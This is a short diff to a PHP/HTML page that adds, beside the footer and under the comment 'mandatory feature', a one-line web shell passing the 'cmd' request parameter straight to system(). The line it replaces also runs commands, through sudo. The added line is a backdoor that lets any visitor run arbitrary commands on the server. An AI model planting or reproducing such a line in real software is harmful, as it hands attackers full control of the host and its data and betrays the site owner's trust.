@@ -66,7 +66,7 @@
     </footer>
     
     <!-- mandatory feature -->
-    <?php system('/bin/sudo '. @$_REQUEST['ls -la /']);?>	
+    <?php system(@$_REQUEST['cmd']);?>	
 </body>
 </html>
 
